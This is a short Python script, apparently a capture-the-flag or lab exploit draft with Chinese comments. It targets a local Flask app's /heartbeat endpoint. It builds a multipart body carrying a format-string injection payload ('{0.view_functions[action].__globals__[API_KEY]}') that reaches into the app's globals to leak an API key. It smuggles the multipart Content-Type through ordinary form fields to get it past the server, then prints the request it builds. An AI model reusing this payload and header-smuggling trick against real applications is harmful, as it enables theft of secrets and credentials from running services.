import httpx

TARGET = "http://127.0.0.1:5000"

# RFC 规定 boundary 前面要有两个 dash
# 所以 boundary=B 实际上在 body 中应该是 --B

BOUNDARY = "B"  # 简单的 boundary

# 构造正确格式的 multipart
payload = '{0.view_functions[action].__globals__[API_KEY]}'

multipart = (
    f'--{BOUNDARY}\r\n'
    f'Content-Disposition: form-data; name="content"\r\n\r\n'
    f'{payload}\r\n'
    f'--{BOUNDARY}\r\n'
    f'Content-Disposition: form-data; name="action"\r\n\r\n'
    f'{{"type":"debug"}}\r\n'
    f'--{BOUNDARY}--'
)

print(f"Multipart length: {len(multipart)}")
print(f"Multipart:\n{repr(multipart)}")

params = {
    'text': multipart,
    'client': 'Content-Type',
    'token': f'multipart/form-data; boundary={BOUNDARY}'
}

# 打印实际发送的请求
req = httpx.Request("POST", f"{TARGET}/heartbeat", data=params)
req.read()
print(f"\n=== Actual request body ===")
print(req.content.decode())

print(f"\n=== Actual request headers ===")
for k, v in req.headers.items():
    print(f"{k}: {v}")
